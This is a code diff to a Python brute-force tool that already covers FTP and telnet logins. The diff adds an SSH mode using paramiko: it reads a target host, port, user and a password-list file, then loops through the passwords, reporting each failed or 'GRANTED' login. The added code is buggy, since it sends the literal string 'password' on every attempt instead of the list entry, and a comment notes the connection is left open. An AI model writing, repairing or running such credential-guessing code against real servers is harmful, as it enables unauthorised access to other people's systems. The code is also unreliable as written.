@@ -4,11 +4,12 @@ import time
 from ftplib import FTP, error_perm
 import socket
 import re
+import paramiko
 
 # List and dictonaries
 modes = {
     'a': 'ftp',
-    'b': 'telnet'
+    'b': 'telnet',
     'c': 'ssh'
 }
 
@@ -275,6 +276,48 @@ def ssh():
             print('Mode not found, please try again.')
 
 def ssh_1_info():
+    while True:
+        info['host'] = input(
+            'Enter the host: '
+        )
+        info['port'] = int(input(
+            'Enter the port: '
+        ))
+        info['user'] = input(
+            'Enter the user: '
+        )
+        password_list_file = input(
+            "Please type the file's path containing the passwords' list: "
+        )
+        try:
+            with open(password_list_file, 'r', encoding='utf-8') as file:
+                password_list = [line.strip() for line in file]
+        except FileNotFoundError:
+            print('This file does not exist, please try again.')
+        else:
+            return password_list
+        
+def ssh_1_connect():
+    password_list = ssh_1_info()
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    for password in password_list:
+        try:
+            ssh.connect(hostname=info['host'], port=info['port'], username=info['user'], password='password')
+            time.sleep(1)
+        except paramiko.AuthenticationException:
+            print(f'Login failed with user "{info['user']}" and password "{password}".')
+            ssh.close()
+        else:
+            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
+            break
+    ssh.close()
+    # RIMA APERTO DOPO LA FINE RISOLVERE
+
+
+   
+    
+    
 
     
 
